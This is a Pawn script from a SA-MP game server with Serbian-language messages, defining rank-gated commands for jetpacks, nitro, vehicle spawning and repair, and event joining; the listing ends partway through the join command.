CMD:hidenames( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    
	foreach(new i : Player) ShowPlayerNameTagForPlayer( playerid, i, false );
	SendClientMessage( playerid, 0x33CCFFFF, "#NAMES: {FFFFFF}Sklonili ste imena.");
	return 1;
}

CMD:shownames( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	foreach(new i : Player) ShowPlayerNameTagForPlayer( playerid, i, true );
	SendClientMessage( playerid, 0x33CCFFFF, "#NAMES: {FFFFFF}Pokazali ste imena.");
	return 1;
}

CMD:jetpack( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( UzeoOpremu[ playerid ] || JobDuty[playerid]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas opremu ili job duty (Anti-AA)." );
	if(PlayerInfo[playerid][xAdmin] < 6 && PlayerInvited[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to pasha. :)");

	if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK )
	{
	    new Float:X, Float:Y, Float:Z;
	    GetPlayerPos(playerid, X, Y, Z);
	    SMG_SetPlayerPos(playerid, X, Y, Z+1);
		SendInfoMessage( playerid, "Skinuo si jetpack te je unisten." );
	}
	else
	{
	    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_USEJETPACK );
	    SendInfoMessage( playerid, "Uzeo si JetPack.");
	    DodajWarnRed("~y~(ADMIN) %s(%d) ~w~je uze%s ~y~JetPack.", ImeIgraca(playerid), playerid, getPolForString(playerid, "o", "la"));
   	}
	return 1;
}

CMD:nitro( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 2 && PlayerInfo[ playerid ][ xVIPLevel ] < 5 && PlayerInfo[ playerid ][ xPromoter ] < 2 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu!");

    if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 || PlayerInfo[ playerid ][ xPromoter ] >= 2 && PlayerInfo[ playerid ][ xAdmin ] == 0 )
	{
		if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes nitro dok svercas." );
		if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes dok si na CS-DM." );
		if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
		if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
		if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes nitro dok radis posao ili imas uniformu posla." );
		if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes nitro dok imas wanted level." );
		if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes nitro dok si u jailu." );
      	if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozes nitro dok je pljacka u toku." );
	}
	AddVehicleComponent( GetPlayerVehicleID( playerid ), 1010 );

	GChat(0xFF4500FF, "#NITRO: {FFFFFF}%s je ugradi%s nitro u vozilo.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));
	SendInfoMessage(playerid, "Dodali ste nitro u vozilo.");
    return 1;
}

CMD:veh( playerid, const params[] )
{
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 && PlayerInfo[ playerid ][ xGamemaster ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PosaoVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano poslovno vozilo, ponistite posao pa spawnujte vozilo.");
	if( RentVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano rent vozilo, ponistite rent pa spawnujte vozilo.");
	if( TrkaVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano trkace vozilo, ponistite ili zavrsite utrku pa spawnujte vozilo.");
	if( VipVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano V/T vozilo, unistite ga pa spawnujte vozilo.");
	if( PromoterVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano Promoter vozilo, unistite ga pa spawnujte vozilo.");
	if( YTVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano YT vozilo, unistite ga pa spawnujte vozilo.");
	if( Spectate[ playerid ] != -1) return SendErrorMessage(playerid, "Ne mozete u spectate modu.");

    if( AdminVozilo[ playerid ] == -1 ) 
    {
		new idv,b1,b2;
		if( sscanf( params, "iii", idv, b1, b2 ) ) return SendUsageMessage( playerid, "/veh [id] [boja 1] [boja 2]");
		if( idv < 400 || idv > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611.");
		if( b1 < 0 || b2 < 0 || b1 > 255 || b2 > 255 ) return SendErrorMessage( playerid, "ID boje ne moze biti manji od 0 ili veci od 255.");
		if( PlayerInfo[playerid][xAdmin] < 4)
		{
			switch(idv)
			{
			    case 406, 407, 416, 417, 420, 425, 427, 428, 432, 435, 437, 438, 441,
					 442, 444, 447, 449, 450, 464, 465, 486, 488, 490, 497, 501,
					 520, 523, 524, 525, 528, 530, 531, 532, 537, 538, 544, 552, 556,
					 557, 564, 569, 570, 572, 574, 582, 583, 584, 590, 591, 594, 596,
					 597, 598, 599, 601, 606, 607, 608, 610, 611: return SendErrorMessage(playerid, "To vozilo je zabranjeno za spawnovanje.");
			}
		}
		new Float:Poz[ 3 ];
		GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
		AdminVozilo[ playerid ] = SMG_CreateVehicle(idv, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, b1, b2, -1 );
		LinkVehicleToInterior( AdminVozilo[ playerid ], GetPlayerInterior( playerid ) );
        SetVehicleVirtualWorld( AdminVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
        ResetVehicle( AdminVozilo[ playerid ] );
		vCanDrive[ AdminVozilo[ playerid ] ] = 1;
	    PutPlayerInVehicle( playerid, AdminVozilo[ playerid ], 0 );
		ResetVehicleStatistics( AdminVozilo[ playerid ] );

	    VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false;
        DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]);

		new stringer[ 50+MAX_PLAYER_NAME ];
  		if(PlayerInfo[playerid][xAdmin] >= 5) format( stringer, sizeof( stringer ), "{000000}[ %s - {FFFFFF}%s {000000}]", getRankNameForVeh(playerid), ImeIgraca(playerid) );
  		else if(PlayerInfo[playerid][xAdmin] >= 1 && PlayerInfo[playerid][xAdmin] <= 4) format( stringer, sizeof( stringer ), "{FF0000}[ %s - {FFFFFF}%s {FF0000}]", getRankNameForVeh(playerid), ImeIgraca(playerid) );
  		else if(PlayerInfo[playerid][xSpecAdmin] > 0) format( stringer, sizeof( stringer ), "{4A68C2}[ %s - {FFFFFF}%s {4A68C2}]", getRankNameForVeh(playerid), ImeIgraca(playerid) );
  		else if(PlayerInfo[playerid][xGamemaster] > 0) format( stringer, sizeof( stringer ), "{48E86B}[ %s - {FFFFFF}%s {48E86B}]", getRankNameForVeh(playerid), ImeIgraca(playerid) );
		
		VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = true;
		VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(stringer, -1, 0.0, 0.0, -100.0, 7.5, IPI, AdminVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

		new engine, lights, alarm, doors, bonnet, boot, objective;
	    GetVehicleParamsEx( AdminVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
	    SetVehicleParamsEx( AdminVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );
 
		DodajWarnRed("~y~(VEH) %s ~w~je stvori%s vozilo ~y~ID %d.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), idv);

		SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je stvoreno.", AdminVozilo[ playerid ] );
	}
	else 
	{
	    SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je unisteno.", AdminVozilo[ playerid ] );
	    VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false;
        DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]);
	    ResetVehicle( AdminVozilo[ playerid ] );
		SMG_DestroyVehicle( AdminVozilo[ playerid ] );
		AdminVozilo[ playerid ] = -1;
	}
	return 1;
}

CMD:vipveh( playerid, const params[] )
{
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
	if( PlayerInfo[ playerid ][ xVIPLevel ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PosaoVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano poslovno vozilo, ponistite posao pa spawnujte vozilo.");
	if( RentVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano rent vozilo, ponistite rent pa spawnujte vozilo.");
	if( TrkaVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano trkace vozilo, ponistite ili zavrsite utrku pa spawnujte vozilo.");
	if( AdminVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano A/GM vozilo, unistite ga pa spawnujte vozilo.");
	if( PromoterVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano Promoter vozilo, unistite ga pa spawnujte vozilo.");
	if( YTVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano YT vozilo, unistite ga pa spawnujte vozilo.");
	if( Spectate[ playerid ] != -1) return SendErrorMessage(playerid, "Ne mozete u spectate modu.");

    if( VipVozilo[ playerid ] == -1 )
	{
	    if( !IsPlayerInRangeOfPoint(playerid, 3, 873.9756,-1663.4427,13.5469) ) return SendErrorMessage( playerid, "Niste u bazi na mjestu spawnovanja vozila." );
	    
	    if(gettime() < SpawnovaoVozilo[playerid]) return SendErrorMessage(playerid, "Mozete spawnovati vozilo za %d sec.", SpawnovaoVozilo[playerid] - gettime());

		new idv,b1,b2;
		if( sscanf( params ,"iii", idv, b1, b2 ) ) return SendUsageMessage( playerid, "/vipveh [id] [boja 1] [boja 2]");
		if( idv < 400 || idv > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611.");
		if( b1 < 0 || b2 < 0 || b1 > 255 || b2 > 255 ) return SendErrorMessage( playerid, "ID boje ne moze biti manji od 0 ili veci od 255.");

  		switch(idv)
		{
		    case 406, 407, 416, 417, 420, 425, 427, 428, 432, 435, 437, 438, 441,
				 442, 444, 447, 449, 450, 464, 465, 486, 488, 490, 497, 501,
				 520, 523, 524, 525, 528, 530, 531, 532, 537, 538, 544, 552, 556,
				 557, 564, 569, 570, 572, 574, 582, 583, 584, 590, 591, 594, 596,
				 597, 598, 599, 601, 606, 607, 608, 610, 611: return SendErrorMessage(playerid, "To vozilo je zabranjeno za spawnovanje.");
		}

		VipVozilo[ playerid ] = SMG_CreateVehicle(idv, 873.9756, -1663.4427, 13.5469, 270.0, b1, b2, -1);
		LinkVehicleToInterior( VipVozilo[ playerid ], GetPlayerInterior( playerid ) );
        SetVehicleVirtualWorld( VipVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
        ResetVehicle( VipVozilo[ playerid ] );
		vCanDrive[ VipVozilo[ playerid ] ] = 1;
	    PutPlayerInVehicle( playerid, VipVozilo[ playerid ], 0 );
		ResetVehicleStatistics( VipVozilo[ playerid ] );

		VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = true;
		new string[ 30+MAX_PLAYER_NAME ];
  		format( string, sizeof( string ), "[ VIP - {FFFFFF}%s {9E5B5B}]", ImeIgraca(playerid) );
  		VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x9E5B5BFF, 0.0, 0.0, -100.0, 7.5, IPI, VipVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

		new engine, lights, alarm, doors, bonnet, boot, objective;

	    GetVehicleParamsEx( VipVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
	    SetVehicleParamsEx( VipVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );
 
		DodajWarnRed("~y~(VEH) ~w~VIP ~y~%s ~w~je stvori%s vozilo ~y~ID %d.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), idv);

		SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je stvoreno.", VipVozilo[ playerid ] );

		if(PlayerInfo[playerid][xVIPLevel] != 6) SpawnovaoVozilo[playerid] = gettime()+120;
	}
	else
	{
	    SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je unisteno.", VipVozilo[ playerid ] );

		VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = false;
        DestroyDynamic3DTextLabel(VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ]);
	    ResetVehicle( VipVozilo[ playerid ] );
		SMG_DestroyVehicle( VipVozilo[ playerid ] );
		VipVozilo[ playerid ] = -1;
	}
	return 1;
}

CMD:promoterveh( playerid, const params[] )
{
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
	if( PlayerInfo[ playerid ][ xPromoter ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PosaoVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano poslovno vozilo, ponistite posao pa spawnujte vozilo.");
	if( RentVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano rent vozilo, ponistite rent pa spawnujte vozilo.");
	if( TrkaVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano trkace vozilo, ponistite ili zavrsite utrku pa spawnujte vozilo.");
	if( AdminVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano A/GM vozilo, unistite ga pa spawnujte vozilo.");
	if( YTVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano YT vozilo, unistite ga pa spawnujte vozilo.");
	if( Spectate[ playerid ] != -1) return SendErrorMessage(playerid, "Ne mozete u spectate modu.");

	if( PromoterVozilo[ playerid ] != -1 ) 
	{
	    SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je unisteno.", PromoterVozilo[ playerid ] );

		VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = false;
        DestroyDynamic3DTextLabel(VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ]);
	    ResetVehicle( PromoterVozilo[ playerid ] );
		SMG_DestroyVehicle( PromoterVozilo[ playerid ] );
		PromoterVozilo[ playerid ] = -1;
	}
	else
	{
		if( !IsPlayerInRangeOfPoint(playerid, 3.0, 873.9756, -1663.4427, 13.5469) ) return SendErrorMessage( playerid, "Niste u bazi na mjestu spawnovanja vozila." );
		if(gettime() < SpawnovaoVozilo[playerid]) return SendErrorMessage(playerid, "Mozete spawnovati vozilo za %d sec.", gettime()-SpawnovaoVozilo[playerid]);

		ShowPlayerDialog(playerid, dialog_PROMOTERVEH, DIALOG_STYLE_LIST, "{FFFFFF}Promoter Vozilo:",
																									"{4282C0}(1). {FFFFFF}Sultan\n\
																									{4282C0}(2). {FFFFFF}Huntley\n\
																									{4282C0}(3). {FFFFFF}Sparrow\n\
																									{4282C0}(4). {FFFFFF}Infernus\n\
																									{4282C0}(5). {FFFFFF}Turismo\n\
																									{4282C0}(6). {FFFFFF}NRG\n\
																									{4282C0}(7). {FFFFFF}Bullet", "Potvrdi", "Zatvori");
	}
	return 1;
}
alias:promoterveh("pveh");

CMD:ytveh( playerid, const params[] )
{
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
	if( PlayerInfo[ playerid ][ xYouTuber ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PosaoVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano poslovno vozilo, ponistite posao pa spawnujte vozilo.");
	if( RentVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano rent vozilo, ponistite rent pa spawnujte vozilo.");
	if( TrkaVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano trkace vozilo, ponistite ili zavrsite utrku pa spawnujte vozilo.");
	if( AdminVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano A/GM vozilo, unistite ga pa spawnujte vozilo.");
	if( PromoterVozilo[playerid] != -1 ) return SendErrorMessage(playerid, "Imate spawnovano Promoter vozilo, unistite ga pa spawnujte vozilo.");
	if( Spectate[ playerid ] != -1) return SendErrorMessage(playerid, "Ne mozete u spectate modu.");

	if( YTVozilo[ playerid ] != -1 ) 
	{
	    SendInfoMessage( playerid, "Vozilo ID {FFFFFF}(%d) {4282C0}je unisteno.", YTVozilo[ playerid ] );

		VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = false;
        DestroyDynamic3DTextLabel(VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ]);
	    ResetVehicle( YTVozilo[ playerid ] );
		SMG_DestroyVehicle( YTVozilo[ playerid ] );
		YTVozilo[ playerid ] = -1;
	}
	else
	{
		if( !IsPlayerInRangeOfPoint(playerid, 3.0, 873.9756, -1663.4427, 13.5469) ) return SendErrorMessage( playerid, "Niste u bazi na mjestu spawnovanja vozila." );
		if(gettime() < SpawnovaoVozilo[playerid]) return SendErrorMessage(playerid, "Mozete spawnovati vozilo za %d sec.", gettime()-SpawnovaoVozilo[playerid]);

		ShowPlayerDialog(playerid, dialog_YTVEH, DIALOG_STYLE_LIST, "{FFFFFF}YouTuber Vozilo:",
																									"{4282C0}(1). {FFFFFF}Sultan\n\
																									{4282C0}(2). {FFFFFF}Huntley\n\
																									{4282C0}(3). {FFFFFF}Sparrow\n\
																									{4282C0}(4). {FFFFFF}Infernus\n\
																									{4282C0}(5). {FFFFFF}Turismo\n\
																									{4282C0}(6). {FFFFFF}NRG\n\
																									{4282C0}(7). {FFFFFF}Bullet", "Potvrdi", "Zatvori");
	}
	return 1;
}

CMD:fixveh( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xYouTuber ] >= 1 )
	{
		if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] <= 4 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
		{
		    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( (PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] <= 4) && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		}
		else if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xYouTuber ] >= 1 )
		{
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na trci." );
			if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na eventu." );
            if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );
			if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes fixati vozilo dok imas wanted level." );
            if( ServerInfo[ PaketPoceo ] ) return SendErrorMessage( playerid, "Ne mozes ovo jer je pokrenut sistem paketa za mafije(ANTI ABUSE)." );
            if( PlayerInfo[playerid][xWanted] != 0 ) return SendErrorMessage(playerid, "Ne mozete dok imate WL.");
            if(PoliceDuty[playerid]) return SendErrorMessage(playerid, "Ne mozete dok ste policajac na duznosti.");
		}

		if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!");
	    if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Niste na mestu vozaca!");

		new Float:X, Float:Y, Float:Z, Float:A;
		GetPlayerPos( playerid, X, Y, Z );
		GetVehicleZAngle( GetPlayerVehicleID( playerid ), A );
		SetVehicleZAngle( GetPlayerVehicleID( playerid ), A );
		SMG_RepairVehicle( playerid, GetPlayerVehicleID( playerid ) );
		vCanDrive[ GetPlayerVehicleID( playerid ) ] = 1;
 
	   	DodajWarnRed("~y~(FIXVEH) %s ~w~je popravi%s svoje vozilo.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

		SendInfoMessage( playerid, "Okrenuli ste se sa vozilom i popravili vozilo." );
	}
	return 1;
}
alias:fixveh( "fv" );

CMD:fvp( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
	{
		if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 || ( PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 && (PlayerInfo[ playerid ][ xAdmin ] >= 1 && PlayerInfo[ playerid ][ xAdmin ] < 4) ) )
		{
		    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xAdmin ] <= 4 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		}

        new idigraca;
		if( sscanf( params, "r", idigraca ) ) return SendUsageMessage( playerid, "/fvp [id]" );
		if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
		if( !IsPlayerInAnyVehicle( idigraca ) ) return SendErrorMessage( playerid, "Igrac nije u vozilu!");
	    if( GetPlayerState( idigraca ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Igrac nije na mestu vozaca!");
	    if( PlayerInfo[idigraca][xWanted] != 0 ) return SendErrorMessage(playerid, "Igrac ima WL, ne mozete mu fixat vozilo.");
	    if( PlayerInfo[idigraca][xLevel] > 5 && PlayerInfo[playerid][xAdmin] < 3 ) return SendErrorMessage(playerid, "Ne mozete mu fixat vozilo jer je level 5+, nek' koristi mehanicara.");

		new Float:X, Float:Y, Float:Z, Float:A;
		GetPlayerPos( idigraca, X, Y, Z );
		GetVehicleZAngle( GetPlayerVehicleID( idigraca ), A );
		SetVehicleZAngle( GetPlayerVehicleID( idigraca ), A );
		SMG_RepairVehicle( playerid, GetPlayerVehicleID( idigraca ) );
		vCanDrive[ GetPlayerVehicleID( idigraca ) ] = 1;
 
	   	DodajWarnRed("~y~(FVP|VR) %s ~w~je popravi%s vozilo igracu ~y~%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( idigraca ) );

		SendInfoMessage( idigraca, "Admin {FFFFFF}%s {4282C0}vam je popravi%s vozilo.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));
	}
	return 1;
}
alias:fvp("vr");

CMD:enapusti( playerid )
{
	if( EventInfo[ Started ] == 0 ) return SendErrorMessage( playerid, "Nijedan event nije upaljen.");
	if( PlayerCP[ playerid ] <= 0 && PlayerInvited[ playerid ] == 0 ) return SendErrorMessage( playerid, "Niste na eventu." );

	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u jailu / prisonu.");

/*	EventInfo[ Drivers ]--;
	SMG_TogglePlayerControllable( playerid, true );
	SetPlayerVirtualWorld( playerid, 0 );
	PlayerCP[ playerid ] = 0;
	PlayerInvited[ playerid ] = 0;
	DisablePlayerRaceCheckpoint( playerid );
	DisablePlayerCheckpoint( playerid );

	if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
	{
		VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
		ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
		SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
		PlayerEventVehID[ playerid ] = -1;
	}

	SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
	SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
	SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );

*/

	if( EventInfo[ Started ] == event_LIVE )
	{
	    EventInfo[ Drivers ]--;

		if( PlayerInvited[ playerid ] > 0 )
		{
			PlayerInvited[ playerid ] = 0;
			PlayerCP[playerid] = 0;
			SMG_TogglePlayerControllable( playerid, true );

            SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
			SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
			SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
			DisablePlayerCheckpoint(playerid);
		}
 
		DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'LIVE EVENT'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Nijedan event nije upaljen");
	return 1;
}

CMD:join( playerid, const params[] )
{
	if( AdminDuty[playerid] ) return SendErrorMessage(playerid, "Ne mozete na duznosti.");
	if( EventInfo[ Started ] == 0 ) return SendErrorMessage( playerid, "Nijedan event nije upaljen.");

	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );

	if( EventInfo[ EventTime ] <= 3 ) return SendErrorMessage( playerid, "Vreme za join je isteklo.");
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
	if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );

	if( EventInfo[ Started ] != 0 && PlayerInvited[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec si na eventu." );

	if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u jailu / prisonu.");
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Nemoguce je trenutno otici na event, limit vozila na serveru je dosegnut.");

    if(EventInfo[ Started ] == event_LIVE)
    {
		if( EventInfo[ Drivers ] == 100 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj na live eventu (100).");
    }
    else
    {
		if( EventInfo[ Drivers ] == 20 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj na eventu (20).");
    }

	EventInfo[ Drivers ]++;

	if( EventInfo[ Started ] == event_STUNT )
	{
	    PlayerInvited[ playerid ] = event_STUNT;
		PlayerEventVehID[ playerid ] = ( EventInfo[ Drivers ]-1 );

		if( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] != IVI )
		{
		    ResetVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
			SMG_DestroyVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
		}

		GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
